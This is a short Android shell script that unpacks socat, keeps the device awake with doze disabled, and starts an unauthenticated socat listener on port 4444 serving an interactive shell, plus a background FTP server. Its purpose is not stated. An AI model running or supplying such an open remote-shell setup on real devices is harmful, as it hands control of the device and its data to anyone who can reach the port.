[ -f /sdcard/socat_install.tar.gz ] && tar -xzf /sdcard/socat_install.tar.gz -C /data/local/tmp && rm -f /sdcard/socat_install.tar.gz
chmod +x /data/local/tmp/socat
chmod +x /data/local/tmp/bftpd
svc power stayon true
dumpsys deviceidle disable
PATH=$PATH:/data/local/tmp nohup /data/local/tmp/socat -T 86400 TCP-LISTEN:4444,reuseaddr,fork,keepalive EXEC:'/system/bin/sh -i',pty,stderr,setsid,ctty,echo=0,sigint,sane </dev/null >/dev/null 2>&1 &
nohup /data/local/tmp/bftpd -D -c /data/local/tmp/bftpd.conf &
